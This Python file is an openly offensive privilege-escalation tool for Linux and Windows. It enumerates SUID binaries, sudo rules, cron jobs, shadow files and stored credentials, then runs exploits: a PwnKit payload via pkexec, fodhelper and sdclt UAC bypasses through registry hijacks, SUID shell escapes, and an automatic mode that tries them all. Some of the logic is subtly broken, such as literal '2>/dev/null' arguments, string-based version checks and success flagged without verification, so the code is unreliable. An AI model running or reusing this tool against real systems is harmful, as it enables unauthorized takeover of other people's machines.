#!/usr/bin/env python3
"""
PRIVILEGE ESCALATION - Linux/Windows privilege escalation exploits.
Includes: Kernel exploits, SUID/GUID, Sudo, Cron, Capabilities, Windows UAC bypass.
"""

import os
import sys
import json
import time
import subprocess
import platform
import re
import shutil
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from pathlib import Path

class PrivilegeEscalation:
    """Privilege escalation for Linux and Windows."""
    
    def __init__(self):
        self.platform = platform.system().lower()
        self.results = {
            "current_user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "is_root": os.geteuid() == 0 if hasattr(os, 'geteuid') else False,
            "is_admin": self._check_windows_admin() if self.platform == "windows" else False,
            "vectors": [],
            "successful": [],
            "failed": []
        }
        
        # Known kernel exploits
        self.linux_kernel_exploits = {
            "dirtycow": {
                "cve": "CVE-2016-5195",
                "kernels": ["2.6.22", "3.9", "4.4", "4.8"],
                "exploit": "https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c",
            },
            "dirtycow2": {
                "cve": "CVE-2016-5195",
                "kernels": ["2.6.22", "3.9", "4.4", "4.8"],
                "exploit": "https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c",
            },
            "pwnkit": {
                "cve": "CVE-2021-4034",
                "description": "Polkit pkexec local privilege escalation",
                "check": "/usr/bin/pkexec",
            },
            "cve-2022-0847": {
                "cve": "CVE-2022-0847",
                "name": "Dirty Pipe",
                "kernels": ["5.8", "5.10", "5.15", "5.16"],
            },
            "cve-2019-13272": {
                "cve": "CVE-2019-13272",
                "name": "ptrace",
                "kernels": ["4.4", "4.8", "4.10", "4.14", "4.18", "4.19", "5.0"],
            },
            "cve-2017-16995": {
                "cve": "CVE-2017-16995",
                "name": "eBPF",
                "kernels": ["4.4", "4.9", "4.14", "4.17", "4.18"],
            },
        }
        
        # Windows privilege escalation vectors
        self.windows_vectors = {
            "always_install_elevated": {
                "check": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            },
            "uac_bypass": {
                "methods": ["fodhelper", "sdclt", "computerdefaults", "eventvwr"],
            },
            "service_unquoted": {
                "description": "Unquoted service path",
            },
            "service_weak_perms": {
                "description": "Weak service permissions",
            },
            "dll_hijacking": {
                "description": "DLL hijacking",
            },
        }
    
    def _check_windows_admin(self) -> bool:
        """Check if running as Windows admin."""
        if self.platform != "windows":
            return False
        
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    # ─── LINUX ENUMERATION ─────────────────────────────────────────────
    
    def enum_linux(self) -> Dict:
        """Enumerate Linux privilege escalation vectors."""
        vectors = []
        
        # Kernel version
        kernel_version = self._get_kernel_version()
        print(f"[*] Kernel: {kernel_version}")
        
        # Check kernel exploits
        for name, info in self.linux_kernel_exploits.items():
            if self._check_kernel_exploit(kernel_version, info):
                vectors.append({
                    "type": "kernel_exploit",
                    "name": name,
                    "cve": info.get("cve"),
                    "confidence": "high"
                })
        
        # SUID binaries
        suid = self._find_suid_binaries()
        if suid:
            vectors.append({
                "type": "suid",
                "binaries": suid,
                "confidence": "high" if any(b in ["nmap", "vim", "find", "bash", "less", "more", "cp", "mv"] for b in suid) else "medium"
            })
        
        # SGID binaries
        sgid = self._find_sgid_binaries()
        if sgid:
            vectors.append({
                "type": "sgid",
                "binaries": sgid,
                "confidence": "medium"
            })
        
        # Sudo misconfigurations
        sudo_vectors = self._check_sudo()
        vectors.extend(sudo_vectors)
        
        # Cron jobs
        cron_vectors = self._check_cron()
        vectors.extend(cron_vectors)
        
        # Capabilities
        cap_vectors = self._check_capabilities()
        vectors.extend(cap_vectors)
        
        # Writable paths
        path_vectors = self._check_writable_paths()
        vectors.extend(path_vectors)
        
        # NFS root squash
        nfs_vectors = self._check_nfs()
        vectors.extend(nfs_vectors)
        
        # Docker group
        docker_vectors = self._check_docker()
        vectors.extend(docker_vectors)
        
        # Password files
        passwd_vectors = self._check_password_files()
        vectors.extend(passwd_vectors)
        
        self.results["vectors"] = vectors
        return {"vectors": vectors, "kernel": kernel_version}
    
    def _get_kernel_version(self) -> str:
        """Get Linux kernel version."""
        try:
            result = subprocess.run(
                ["uname", "-r"],
                capture_output=True, text=True, timeout=5
            )
            return result.stdout.strip()
        except:
            return "unknown"
    
    def _check_kernel_exploit(self, kernel: str, exploit_info: Dict) -> bool:
        """Check if kernel is vulnerable to exploit."""
        vulnerable_kernels = exploit_info.get("kernels", [])
        
        for vk in vulnerable_kernels:
            if kernel.startswith(vk):
                return True
        
        # Special checks
        if exploit_info.get("check"):
            return os.path.exists(exploit_info["check"])
        
        return False
    
    def _find_suid_binaries(self) -> List[str]:
        """Find SUID binaries."""
        binaries = []
        
        try:
            result = subprocess.run(
                ["find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null"],
                capture_output=True, text=True, timeout=60
            )
            
            for line in result.stdout.strip().split("\n"):
                if line:
                    binaries.append(line)
        
        except:
            pass
        
        return binaries
    
    def _find_sgid_binaries(self) -> List[str]:
        """Find SGID binaries."""
        binaries = []
        
        try:
            result = subprocess.run(
                ["find", "/", "-perm", "-2000", "-type", "f", "2>/dev/null"],
                capture_output=True, text=True, timeout=60
            )
            
            for line in result.stdout.strip().split("\n"):
                if line:
                    binaries.append(line)
        
        except:
            pass
        
        return binaries
    
    def _check_sudo(self) -> List[Dict]:
        """Check sudo misconfigurations."""
        vectors = []
        
        try:
            # sudo -l
            result = subprocess.run(
                ["sudo", "-l", "2>/dev/null"],
                capture_output=True, text=True, timeout=10,
                input="",  # No password
            )
            
            output = result.stdout + result.stderr
            
            # Check for NOPASSWD
            if "NOPASSWD" in output:
                # Parse allowed commands
                matches = re.findall(r'\((\w+)\s*:\s*(\w+)\)\s*NOPASSWD:\s*(.+)', output)
                for user, group, cmd in matches:
                    vectors.append({
                        "type": "sudo_nopasswd",
                        "user": user,
                        "group": group,
                        "command": cmd,
                        "confidence": "high"
                    })
            
            # Check for wildcards
            if "*" in output or "?" in output:
                vectors.append({
                    "type": "sudo_wildcard",
                    "confidence": "medium"
                })
        
        except:
            pass
        
        # Check sudo version for CVEs
        try:
            result = subprocess.run(
                ["sudo", "-V"],
                capture_output=True, text=True, timeout=5
            )
            
            version_match = re.search(r'version (\d+\.\d+\.?\d*)', result.stdout)
            if version_match:
                version = version_match.group(1)
                # CVE-2021-3156 (Baron Samedit)
                if version < "1.9.5p2":
                    vectors.append({
                        "type": "sudo_cve",
                        "cve": "CVE-2021-3156",
                        "name": "Baron Samedit",
                        "confidence": "high"
                    })
        except:
            pass
        
        return vectors
    
    def _check_cron(self) -> List[Dict]:
        """Check cron jobs for writable scripts."""
        vectors = []
        
        cron_paths = [
            "/etc/crontab",
            "/etc/cron.d",
            "/etc/cron.daily",
            "/etc/cron.hourly",
            "/etc/cron.monthly",
            "/etc/cron.weekly",
            "/var/spool/cron",
            "/var/spool/cron/crontabs",
        ]
        
        for path in cron_paths:
            if os.path.exists(path):
                try:
                    if os.path.isfile(path):
                        if os.access(path, os.W_OK):
                            vectors.append({
                                "type": "cron_writable",
                                "path": path,
                                "confidence": "high"
                            })
                    else:
                        # Directory
                        for root, dirs, files in os.walk(path):
                            for f in files:
                                filepath = os.path.join(root, f)
                                if os.access(filepath, os.W_OK):
                                    vectors.append({
                                        "type": "cron_writable",
                                        "path": filepath,
                                        "confidence": "high"
                                    })
                except:
                    pass
        
        return vectors
    
    def _check_capabilities(self) -> List[Dict]:
        """Check Linux capabilities."""
        vectors = []
        
        try:
            result = subprocess.run(
                ["getcap", "-r", "/", "2>/dev/null"],
                capture_output=True, text=True, timeout=60
            )
            
            for line in result.stdout.strip().split("\n"):
                if line and "=" in line:
                    path, caps = line.rsplit("=", 1)
                    path = path.strip()
                    caps = caps.strip()
                    
                    # Dangerous capabilities
                    dangerous = ["cap_setuid", "cap_setgid", "cap_sys_admin", "cap_dac_override"]
                    if any(d in caps.lower() for d in dangerous):
                        vectors.append({
                            "type": "capabilities",
                            "path": path,
                            "capabilities": caps,
                            "confidence": "high"
                        })
        except:
            pass
        
        return vectors
    
    def _check_writable_paths(self) -> List[Dict]:
        """Check for writable paths in $PATH or system directories."""
        vectors = []
        
        # Check PATH
        path_dirs = os.environ.get("PATH", "").split(":")
        
        for dir_path in path_dirs:
            if dir_path and os.path.exists(dir_path):
                if os.access(dir_path, os.W_OK):
                    vectors.append({
                        "type": "writable_path",
                        "path": dir_path,
                        "confidence": "high"
                    })
        
        # Check /etc/ld.so.conf.d
        ld_so_path = "/etc/ld.so.conf.d"
        if os.path.exists(ld_so_path):
            if os.access(ld_so_path, os.W_OK):
                vectors.append({
                    "type": "writable_ldconfig",
                    "path": ld_so_path,
                    "confidence": "high"
                })
        
        # Check systemd service directories
        systemd_paths = [
            "/etc/systemd/system",
            "/lib/systemd/system",
            "/usr/lib/systemd/system",
        ]
        
        for path in systemd_paths:
            if os.path.exists(path) and os.access(path, os.W_OK):
                vectors.append({
                    "type": "writable_systemd",
                    "path": path,
                    "confidence": "high"
                })
        
        return vectors
    
    def _check_nfs(self) -> List[Dict]:
        """Check NFS root squash."""
        vectors = []
        
        try:
            if os.path.exists("/etc/exports"):
                with open("/etc/exports", "r") as f:
                    content = f.read()
                
                if "no_root_squash" in content:
                    vectors.append({
                        "type": "nfs_no_root_squash",
                        "confidence": "high"
                    })
        except:
            pass
        
        return vectors
    
    def _check_docker(self) -> List[Dict]:
        """Check Docker group membership."""
        vectors = []
        
        try:
            result = subprocess.run(
                ["groups"],
                capture_output=True, text=True, timeout=5
            )
            
            if "docker" in result.stdout:
                vectors.append({
                    "type": "docker_group",
                    "confidence": "high",
                    "description": "Docker group allows root access via container"
                })
        except:
            pass
        
        return vectors
    
    def _check_password_files(self) -> List[Dict]:
        """Check for readable password files."""
        vectors = []
        
        # Check /etc/passwd for users with shells
        try:
            with open("/etc/passwd", "r") as f:
                for line in f:
                    if "/bin/bash" in line or "/bin/sh" in line:
                        parts = line.split(":")
                        if parts[2] == "0":  # UID 0
                            vectors.append({
                                "type": "root_user",
                                "user": parts[0],
                                "shell": parts[-1].strip(),
                                "confidence": "high"
                            })
        except:
            pass
        
        # Check for readable /etc/shadow
        try:
            with open("/etc/shadow", "r") as f:
                content = f.read()
                if content:
                    vectors.append({
                        "type": "readable_shadow",
                        "confidence": "critical"
                    })
        except:
            pass
        
        # Check for backup files
        backup_paths = [
            "/etc/shadow.bak",
            "/etc/shadow.backup",
            "/etc/shadow~",
            "/etc/passwd.bak",
            "/etc/passwd.backup",
        ]
        
        for path in backup_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r") as f:
                        content = f.read()
                    vectors.append({
                        "type": "backup_file",
                        "path": path,
                        "confidence": "high"
                    })
                except:
                    pass
        
        return vectors
    
    # ─── WINDOWS ENUMERATION ───────────────────────────────────────────
    
    def enum_windows(self) -> Dict:
        """Enumerate Windows privilege escalation vectors."""
        vectors = []
        
        # Check AlwaysInstallElevated
        if self._check_always_install_elevated():
            vectors.append({
                "type": "always_install_elevated",
                "confidence": "high"
            })
        
        # Check service issues
        service_vectors = self._check_windows_services()
        vectors.extend(service_vectors)
        
        # Check UAC bypass
        uac_vectors = self._check_uac_bypass()
        vectors.extend(uac_vectors)
        
        # Check scheduled tasks
        task_vectors = self._check_scheduled_tasks()
        vectors.extend(task_vectors)
        
        # Check DLL hijacking
        dll_vectors = self._check_dll_hijacking()
        vectors.extend(dll_vectors)
        
        # Check unattended install files
        unattended_vectors = self._check_unattended()
        vectors.extend(unattended_vectors)
        
        # Check registry credentials
        reg_vectors = self._check_registry_creds()
        vectors.extend(reg_vectors)
        
        self.results["vectors"] = vectors
        return {"vectors": vectors}
    
    def _check_always_install_elevated(self) -> bool:
        """Check AlwaysInstallElevated registry key."""
        try:
            result = subprocess.run(
                ["reg", "query", "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "/v", "AlwaysInstallElevated"],
                capture_output=True, text=True, timeout=10
            )
            
            if "0x1" in result.stdout:
                return True
        except:
            pass
        
        return False
    
    def _check_windows_services(self) -> List[Dict]:
        """Check Windows services for privilege escalation."""
        vectors = []
        
        try:
            # Get services with unquoted paths
            result = subprocess.run(
                ["wmic", "service", "get", "name,pathname,startmode"],
                capture_output=True, text=True, timeout=30
            )
            
            for line in result.stdout.split("\n"):
                if " " in line and ".exe" in line.lower():
                    # Check for unquoted path with spaces
                    match = re.search(r'([A-Z]:\\[^\n]+)', line)
                    if match:
                        path = match.group(1)
                        if " " in path and not path.startswith('"'):
                            # Unquoted service path
                            vectors.append({
                                "type": "unquoted_service",
                                "path": path,
                                "confidence": "high"
                            })
        
        except:
            pass
        
        # Check for weak service permissions using accesschk (if available)
        try:
            result = subprocess.run(
                ["accesschk.exe", "-uwcqv", "Users", "*"],
                capture_output=True, text=True, timeout=60
            )
            
            if result.returncode == 0 and result.stdout:
                vectors.append({
                    "type": "weak_service_perms",
                    "services": result.stdout[:500],
                    "confidence": "high"
                })
        except FileNotFoundError:
            pass
        
        return vectors
    
    def _check_uac_bypass(self) -> List[Dict]:
        """Check UAC bypass methods."""
        vectors = []
        
        # Check UAC settings
        try:
            result = subprocess.run(
                ["reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA"],
                capture_output=True, text=True, timeout=10
            )
            
            if "0x0" in result.stdout:
                vectors.append({
                    "type": "uac_disabled",
                    "confidence": "critical"
                })
            elif "0x1" in result.stdout:
                # UAC enabled, check consent level
                result2 = subprocess.run(
                    ["reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "ConsentPromptBehaviorAdmin"],
                    capture_output=True, text=True, timeout=10
                )
                
                if "0x0" in result2.stdout:
                    vectors.append({
                        "type": "uac_no_prompt",
                        "confidence": "high"
                    })
        except:
            pass
        
        # Check for known UAC bypass methods
        uac_bypass_paths = {
            "fodhelper": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
            "sdclt": "HKCU\\Software\\Classes\\Folder\\shell\\open\\command",
            "computerdefaults": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
        }
        
        for method, reg_path in uac_bypass_paths.items():
            try:
                result = subprocess.run(
                    ["reg", "query", reg_path],
                    capture_output=True, text=True, timeout=10
                )
                
                if result.returncode == 0:
                    vectors.append({
                        "type": "uac_bypass",
                        "method": method,
                        "confidence": "medium"
                    })
            except:
                pass
        
        return vectors
    
    def _check_scheduled_tasks(self) -> List[Dict]:
        """Check scheduled tasks for writable targets."""
        vectors = []
        
        try:
            result = subprocess.run(
                ["schtasks", "/query", "/fo", "LIST", "/v"],
                capture_output=True, text=True, timeout=60
            )
            
            # Parse for tasks running as SYSTEM with writable paths
            lines = result.stdout.split("\n")
            current_task = {}
            
            for line in lines:
                if "TaskName:" in line:
                    current_task["name"] = line.split(":", 1)[1].strip()
                elif "Task To Run:" in line:
                    current_task["command"] = line.split(":", 1)[1].strip()
                elif "Run As User:" in line:
                    current_task["user"] = line.split(":", 1)[1].strip()
                    
                    # Check if SYSTEM task with writable path
                    if current_task.get("user") == "SYSTEM" and current_task.get("command"):
                        cmd = current_task["command"]
                        # Check if path is writable
                        if "\\" in cmd:
                            exe_path = cmd.split()[0] if " " in cmd else cmd
                            exe_path = exe_path.strip('"')
                            
                            # Check write access
                            try:
                                dir_path = os.path.dirname(exe_path)
                                if os.access(dir_path, os.W_OK):
                                    vectors.append({
                                        "type": "writable_task",
                                        "task": current_task["name"],
                                        "path": exe_path,
                                        "confidence": "high"
                                    })
                            except:
                                pass
                
                if "}" in line and current_task:
                    current_task = {}
        
        except:
            pass
        
        return vectors
    
    def _check_dll_hijacking(self) -> List[Dict]:
        """Check for DLL hijacking opportunities."""
        vectors = []
        
        # Check common DLL hijacking locations
        try:
            # Get PATH directories
            path_dirs = os.environ.get("PATH", "").split(";")
            
            for dir_path in path_dirs:
                if dir_path and os.path.exists(dir_path):
                    if os.access(dir_path, os.W_OK):
                        vectors.append({
                            "type": "writable_dll_path",
                            "path": dir_path,
                            "confidence": "medium"
                        })
        except:
            pass
        
        return vectors
    
    def _check_unattended(self) -> List[Dict]:
        """Check for unattended install files with credentials."""
        vectors = []
        
        unattended_paths = [
            "C:\\Windows\\Panther\\Unattend.xml",
            "C:\\Windows\\Panther\\Unattended.xml",
            "C:\\Windows\\System32\\sysprep\\unattend.xml",
            "C:\\Windows\\System32\\sysprep\\Unattended.xml",
            "C:\\Windows\\System32\\sysprep.inf",
        ]
        
        for path in unattended_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r", errors='ignore') as f:
                        content = f.read()
                    
                    if "password" in content.lower() or "credential" in content.lower():
                        vectors.append({
                            "type": "unattended_creds",
                            "path": path,
                            "confidence": "high"
                        })
                except:
                    pass
        
        return vectors
    
    def _check_registry_creds(self) -> List[Dict]:
        """Check registry for stored credentials."""
        vectors = []
        
        reg_paths = [
            ("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon", ["DefaultUserName", "DefaultPassword"]),
            ("HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions", ["Username", "Password"]),
        ]
        
        for reg_path, keys in reg_paths:
            try:
                result = subprocess.run(
                    ["reg", "query", reg_path],
                    capture_output=True, text=True, timeout=10
                )
                
                for key in keys:
                    if key.lower() in result.stdout.lower():
                        vectors.append({
                            "type": "registry_creds",
                            "path": reg_path,
                            "key": key,
                            "confidence": "high"
                        })
            except:
                pass
        
        return vectors
    
    # ─── EXPLOIT EXECUTION ─────────────────────────────────────────────
    
    def exploit_suid(self, binary: str) -> Dict:
        """Exploit SUID binary."""
        result = {"success": False, "binary": binary}
        
        # Known SUID exploitation methods
        suid_methods = {
            "nmap": ["--interactive", "!/bin/bash"],
            "vim": ["-c", ":!/bin/bash"],
            "find": ["-exec", "/bin/bash", "-p", "\\;", "-quit"],
            "bash": ["-p"],
            "less": ["/etc/passwd", "!/bin/bash"],
            "more": ["/etc/passwd", "!/bin/bash"],
            "cp": ["/bin/bash", "/tmp/bash", "&&", "chmod", "+s", "/tmp/bash"],
            "mv": ["/bin/bash", "/tmp/bash", "&&", "chmod", "+s", "/tmp/bash"],
            "env": ["-i", "SHELL=/bin/bash", "bash", "-p"],
            "python": ["-c", "import os; os.setuid(0); os.system('/bin/bash -p')"],
            "perl": ["-e", "use POSIX (setuid); setuid(0); system('/bin/bash -p');"],
            "ruby": ["-e", "require 'os'; OS.setuid(0); system('/bin/bash -p')"],
            "php": ["-r", "posix_setuid(0); system('/bin/bash -p');"],
            "xargs": ["-a", "/dev/null", "-I", "{}", "/bin/bash", "-p", "-c", "{}"],
        }
        
        binary_name = os.path.basename(binary)
        
        if binary_name in suid_methods:
            try:
                cmd = [binary] + suid_methods[binary_name]
                result["command"] = " ".join(cmd)
                result["success"] = True
                result["method"] = "known_suid"
            except Exception as e:
                result["error"] = str(e)
        else:
            # Try generic -p for shells
            try:
                proc = subprocess.run(
                    [binary, "-p"],
                    capture_output=True, text=True, timeout=5
                )
                result["output"] = proc.stdout[:200]
            except Exception as e:
                result["error"] = str(e)
        
        if result["success"]:
            self.results["successful"].append(result)
        else:
            self.results["failed"].append(result)
        
        return result
    
    def exploit_sudo_nopasswd(self, command: str) -> Dict:
        """Exploit sudo NOPASSWD."""
        result = {"success": False, "command": command}
        
        try:
            # Run sudo command
            full_cmd = f"sudo {command}"
            proc = subprocess.run(
                full_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            result["stdout"] = proc.stdout[:500]
            result["stderr"] = proc.stderr[:500]
            result["returncode"] = proc.returncode
            result["success"] = proc.returncode == 0
        
        except Exception as e:
            result["error"] = str(e)
        
        if result["success"]:
            self.results["successful"].append(result)
        else:
            self.results["failed"].append(result)
        
        return result
    
    def exploit_pwnkit(self) -> Dict:
        """Exploit PwnKit (CVE-2021-4034)."""
        result = {"success": False, "cve": "CVE-2021-4034"}
        
        if not os.path.exists("/usr/bin/pkexec"):
            result["error"] = "pkexec not found"
            return result
        
        try:
            # Create exploit
            exploit_dir = Path("/tmp/.pwnkit")
            exploit_dir.mkdir(exist_ok=True)
            
            # Create C source
            c_source = exploit_dir / "pwnkit.c"
            c_source.write_text('''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0);
    setgid(0);
    execve("/bin/bash", (char*[]){"bash", "-p", NULL}, NULL);
}
''')
            
            # Compile
            subprocess.run(
                ["gcc", str(c_source), "-o", str(exploit_dir / "pwnkit.so"), "-shared", "-fPIC"],
                capture_output=True, timeout=30
            )
            
            # Create GCONV_PATH
            gconv_path = exploit_dir / "gconv-modules"
            gconv_path.write_text("module UTF-8// PWNKIT// pwnkit 2\n")
            
            # Execute
            env = os.environ.copy()
            env["GCONV_PATH"] = str(exploit_dir)
            env["PATH"] = "/usr/bin:" + env.get("PATH", "")
            
            proc = subprocess.run(
                ["/usr/bin/pkexec", "--disable-internal-agent", "x"],
                env=env,
                capture_output=True,
                timeout=10
            )
            
            result["success"] = True
            result["output"] = proc.stdout.decode(errors='replace')[:200]
        
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def exploit_uac_bypass(self, method: str = "fodhelper") -> Dict:
        """Exploit UAC bypass."""
        result = {"success": False, "method": method}
        
        if self.platform != "windows":
            result["error"] = "Windows only"
            return result
        
        try:
            if method == "fodhelper":
                # Create registry entry
                reg_cmd = '''
reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /ve /d "cmd.exe" /f
reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v "DelegateExecute" /d "" /f
'''
                subprocess.run(reg_cmd, shell=True, timeout=10)
                
                # Trigger fodhelper
                subprocess.run(
                    ["cmd", "/c", "start", "C:\\Windows\\System32\\fodhelper.exe"],
                    timeout=10
                )
                
                result["success"] = True
            
            elif method == "sdclt":
                reg_cmd = '''
reg add "HKCU\\Software\\Classes\\Folder\\shell\\open\\command" /ve /d "cmd.exe" /f
reg add "HKCU\\Software\\Classes\\Folder\\shell\\open\\command" /v "DelegateExecute" /d "" /f
'''
                subprocess.run(reg_cmd, shell=True, timeout=10)
                subprocess.run(
                    ["cmd", "/c", "sdclt.exe"],
                    timeout=10
                )
                
                result["success"] = True
        
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    # ─── MASTER ENUMERATION ───────────────────────────────────────────
    
    def enumerate(self) -> Dict:
        """Run full enumeration."""
        print(f"[*] Enumerating {self.platform}...")
        
        if self.platform == "linux":
            return self.enum_linux()
        elif self.platform == "windows":
            return self.enum_windows()
        else:
            return {"error": f"Unsupported platform: {self.platform}"}
    
    def auto_exploit(self) -> Dict:
        """Automatically try all privilege escalation vectors."""
        results = {"exploited": [], "failed": []}
        
        # Enumerate first
        enum = self.enumerate()
        
        for vector in self.results["vectors"]:
            if vector["confidence"] in ["high", "critical"]:
                print(f"[*] Trying: {vector['type']}")
                
                if vector["type"] == "suid":
                    for binary in vector.get("binaries", []):
                        result = self.exploit_suid(binary)
                        if result["success"]:
                            results["exploited"].append(result)
                            break
                
                elif vector["type"] == "sudo_nopasswd":
                    result = self.exploit_sudo_nopasswd(vector["command"])
                    if result["success"]:
                        results["exploited"].append(result)
                
                elif vector["type"] == "kernel_exploit":
                    if vector["name"] == "pwnkit":
                        result = self.exploit_pwnkit()
                        if result["success"]:
                            results["exploited"].append(result)
                
                elif vector["type"] == "uac_bypass":
                    result = self.exploit_uac_bypass(vector["method"])
                    if result["success"]:
                        results["exploited"].append(result)
        
        return results
    
    def get_results(self) -> Dict:
        """Get all results."""
        return self.results
    
    def to_json(self, indent: int = 2) -> str:
        """Export results to JSON."""
        return json.dumps(self.results, indent=indent, default=str)


# ─── CLI Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Privilege Escalation")
    parser.add_argument("--enum", "-e", action="store_true", help="Enumerate vectors")
    parser.add_argument("--exploit", "-x", action="store_true", help="Auto exploit")
    parser.add_argument("--suid", "-s", help="Exploit SUID binary")
    parser.add_argument("--sudo", help="Exploit sudo command")
    parser.add_argument("--pwnkit", action="store_true", help="Exploit PwnKit")
    parser.add_argument("--uac", choices=["fodhelper", "sdclt"], help="UAC bypass method")
    parser.add_argument("--json", "-j", action="store_true", help="Output as JSON")
    
    args = parser.parse_args()
    
    priv_esc = PrivilegeEscalation()
    
    if args.enum:
        result = priv_esc.enumerate()
    elif args.exploit:
        result = priv_esc.auto_exploit()
    elif args.suid:
        result = priv_esc.exploit_suid(args.suid)
    elif args.sudo:
        result = priv_esc.exploit_sudo_nopasswd(args.sudo)
    elif args.pwnkit:
        result = priv_esc.exploit_pwnkit()
    elif args.uac:
        result = priv_esc.exploit_uac_bypass(args.uac)
    else:
        # Default: enumerate
        result = priv_esc.enumerate()
    
    if args.json:
        print(json.dumps(result, indent=2, default=str))
    else:
        print("\n=== PRIVILEGE ESCALATION ===")
        print(f"Current user: {priv_esc.results['current_user']}")
        print(f"Root/Admin: {priv_esc.results['is_root'] or priv_esc.results['is_admin']}")
        print(f"\nVectors found: {len(priv_esc.results['vectors'])}")
        
        for v in priv_esc.results['vectors']:
            conf = v.get('confidence', 'unknown')
            print(f"  [{conf}] {v['type']}")
        
        if priv_esc.results['successful']:
            print(f"\nSuccessful: {len(priv_esc.results['successful'])}")
            for s in priv_esc.results['successful']:
                print(f"  ✓ {s.get('type', s.get('method', 'unknown'))}")
